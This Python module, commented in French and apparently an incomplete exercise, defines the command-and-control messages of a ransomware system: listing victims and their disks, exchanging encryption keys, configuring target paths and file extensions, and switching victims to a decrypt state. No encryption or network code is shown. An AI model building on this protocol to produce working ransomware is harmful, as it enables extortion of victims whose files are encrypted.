# Définition des messages
# List_victim messages
LIST_VICTIM_REQ = {'LIST_REQ': None}
LIST_VICTIM_RESP = {'VICTIM': 0, 'HASH': '', 'OS': '', 'DISKS': '', 'STATE': '', 'NB_FILES': 0}
LIST_VICTIM_END = {'LIST_END': None}

# history messages
HISTORY_REQ = {'HIST_REQ': 0}
HISTORY_RESP = {'HIST_RESP': 0, 'TIMESTAMP': 0, 'STATE': '', 'NB_FILES': 0}
HISTORY_END = {'HIST_END': 0}

# change_state message
CHANGE_STATE = {'CHGSTATE': 0, 'STATE': 'DECRYPT'}

# initialize message
INITIALIZE_REQ = {'INITIALIZE': '', 'OS': '', 'DISKS': ''}
INITIALIZE_KEY = {'KEY_RESP': 0, 'KEY': '', 'STATE': ''}
INITIALIZE_RESP = {'CONFIGURE': 0, 'SETTING': {'DISKS': [], 'PATHS': [], 'FILE_EXT': [], 'FREQ': 0, 'KEY': ''}}

# message_type
MESSAGE_TYPE = {
    'LIST_REQ': 'LIST_VICTIM_REQ',
    'VICTIM': 'LIST_VICTIM_RESP',
    'LIST_END': 'LIST_VICTIM_END',
    'HIST_REQ': 'HISTORY_REQ',
    'HIST_RESP': 'HISTORY_RESP',
    'HIST_END': 'HISTORY_END',
    'CHGSTATE': 'CHANGE_STATE',
    'INITIALIZE': 'INITIALIZE_REQ',
    'KEY_RESP': 'INITIALIZE_KEY',
    'CONFIGURE': 'INITIALIZE_RESP'
}


def set_message(select_msg, params=None):
    """
    Retourne le dictionnaire correspondant à select_msg et le complète avec params si besoin.
    :param select_msg: le message à récupérer (ex: LIST_VICTIM_REQ)
    :param params: les éventuels paramètres à ajouter au message
    :return: le message sous forme de dictionnaire
    """
    if select_msg.upper() == 'LIST_VICTIM_REQ':
        return LIST_VICTIM_REQ
    if select_msg.upper() == 'LIST_VICTIM_RESP':
        return LIST_VICTIM_RESP
    # à compléter
    if select_msg.upper() == 'LIST_VICTIM_END':
        return LIST_VICTIM_END

    if select_msg.upper() == 'HISTORY_REQ':
        return HISTORY_REQ

    if select_msg.upper() == 'HISTORY_RESP':
        return HISTORY_RESP

    if select_msg.upper() == 'HISTORY_END':
        return HISTORY_END

    if select_msg.upper() == 'CHANGE_STATE':
        return CHANGE_STATE

    if select_msg.upper() == 'INITIALIZE_REQ':
        return INITIALIZE_REQ

    if select_msg.upper() == 'INITIALIZE_KEY':
        return INITIALIZE_KEY

    if select_msg.upper() == 'INITIALIZE_RESP':
        return INITIALIZE_RESP

def get_message_type(message):
    """
    Récupère le nom correspondant au type de message (ex: le dictionnaire LIST_VICTIM_REQ retourne 'LIST_REQ')
    :param message: le dictionnaire représentant le message
    :return: une chaine correspondant au nom du message comme définit par le protocole
    """
